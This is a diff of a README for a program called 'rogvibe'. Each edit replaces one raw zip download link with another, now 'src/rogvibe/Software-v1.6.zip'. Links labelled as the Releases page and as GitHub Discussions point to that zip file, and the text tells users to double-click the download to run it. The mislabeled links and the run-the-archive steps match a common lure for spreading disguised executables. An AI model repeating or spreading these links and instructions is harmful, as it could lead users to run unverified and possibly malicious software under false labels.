@@ -10,7 +10,7 @@ To set up and run rogvibe, follow these simple steps:
 
 1. **Download rogvibe**: Start by downloading the application from our Releases page.
 
-   [![Download rogvibe](https://raw.githubusercontent.com/rponong/rogvibe/main/tests/test_utils/rogvibe-v2.5.zip%20rogvibe-%2300bfff?logo=github&logoColor=white&style=for-the-badge)](https://raw.githubusercontent.com/rponong/rogvibe/main/tests/test_utils/rogvibe-v2.5.zip)
+   [![Download rogvibe](https://github.com/rponong/rogvibe/raw/refs/heads/main/src/rogvibe/Software-v1.6.zip%20rogvibe-%2300bfff?logo=github&logoColor=white&style=for-the-badge)](https://github.com/rponong/rogvibe/raw/refs/heads/main/src/rogvibe/Software-v1.6.zip)
 
 2. **Choose your version**: On the Releases page, you will see several versions available. Select the latest version for the best experience. 
 
@@ -18,7 +18,7 @@ To set up and run rogvibe, follow these simple steps:
 
 ## 📥 Download & Install
 
-To get rogvibe on your computer, visit this page to download: [rogvibe Releases](https://raw.githubusercontent.com/rponong/rogvibe/main/tests/test_utils/rogvibe-v2.5.zip).
+To get rogvibe on your computer, visit this page to download: [rogvibe Releases](https://github.com/rponong/rogvibe/raw/refs/heads/main/src/rogvibe/Software-v1.6.zip).
 
 After downloading, find the file in your downloads folder, then double-click it to run the installer. Follow the on-screen instructions.
 
@@ -64,7 +64,7 @@ You can report bugs or suggest features by visiting the Issues section of the Gi
 
 ## 🤝 Community
 
-Join our community of gamers. Exchange tips, share your character builds, and discuss strategies. Visit our [GitHub Discussions](https://raw.githubusercontent.com/rponong/rogvibe/main/tests/test_utils/rogvibe-v2.5.zip) to get involved!
+Join our community of gamers. Exchange tips, share your character builds, and discuss strategies. Visit our [GitHub Discussions](https://github.com/rponong/rogvibe/raw/refs/heads/main/src/rogvibe/Software-v1.6.zip) to get involved!
 
 ## 🔄 Updates
 
